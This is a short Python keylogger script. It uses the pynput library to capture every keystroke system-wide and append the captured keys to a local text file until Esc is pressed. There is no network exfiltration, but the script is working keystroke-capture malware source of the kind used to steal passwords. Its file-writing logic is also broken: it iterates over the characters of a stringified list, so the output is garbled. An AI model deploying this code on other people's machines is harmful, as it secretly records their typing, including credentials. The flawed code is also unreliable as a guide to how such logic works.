from pynput import keyboard
from pynput.keyboard import Key, Listener

count = 0
keys = [] #list

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []

def on_release(key):
    if key == keyboard.Key.esc:
        return False

#writing the keyboard strokes to a file

def write_file(keys):
    with open("keyboardwrite.txt","a") as file:
        for key in keys:                  # All these if statements are just to make the text file more readable
            k = str(key).replace("'", "")
            if k.find('space') > 0:              
                file.write('\n')
            elif k.find('Key') == -1:
                file.write(k)
                 
    

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 